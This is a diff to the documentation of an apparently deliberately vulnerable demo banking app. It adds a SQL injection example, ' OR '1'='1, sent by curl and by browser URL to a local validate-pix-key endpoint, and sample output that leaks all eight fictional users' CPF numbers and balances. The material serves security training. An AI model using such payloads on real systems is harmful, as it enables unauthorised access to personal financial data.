@@ -168,23 +168,49 @@ The vulnerable endpoint returns these fields from the database:
 
 ### 🔴 SQL Injection Attack Examples
 
-#### 1. Basic Injection - Bypass Authentication (Returns First User)
+> **How Hackers Do It**: SQL Injection attacks are performed via:
+> - **Browser URL bar** - Most common for manual testing
+> - **CLI tools** (curl, wget, httpie) - Preferred by pentesters
+> - **Automated tools** (SQLMap, Burp Suite, OWASP ZAP) - For comprehensive attacks
+
+#### 1. Basic Injection - Dump ALL Users (OR 1=1)
 ```bash
+# This returns ALL users in the database!
 curl "http://localhost/api/transactions/validate-pix-key?pixKey=' OR '1'='1"
 ```
 
-**Expected Response:**
+**In Browser:**
+```
+http://localhost/api/transactions/validate-pix-key?pixKey=' OR '1'='1
+```
+
+**Expected Response (ALL DATA LEAKED!):**
 ```json
 {
   "valid": true,
-  "nome": "Vitoria Itadori",
-  "email": "vitoria.itadori@dogbank.com",
-  "cpf": "***.***.***-15",
-  "saldo": "R$ 10000.00",
-  "banco": "DOG BANK",
-  "chave_pix": "vitoria.itadori@dogbank.com"
+  "sql_injection_detected": true,
+  "records_leaked": 8,
+  "leaked_data": [
+    {
+      "nome": "Vitoria Itadori",
+      "email": "vitoria.itadori@dogbank.com",
+      "cpf": "12345678915",
+      "saldo": "R$ 10000.00",
+      "banco": "DOG BANK",
+      "chave_pix": "vitoria.itadori@dogbank.com"
+    },
+    {
+      "nome": "Pedro Silva",
+      "email": "pedro.silva@dogbank.com",
+      "cpf": "98765432101",
+      "saldo": "R$ 15000.00",
+      "banco": "Banco do Brasil",
+      "chave_pix": "pedro.silva@dogbank.com"
+    },
+    // ... all 8 users with CPF and balances!
+  ]
 }
-```
+````
 
 ---
 
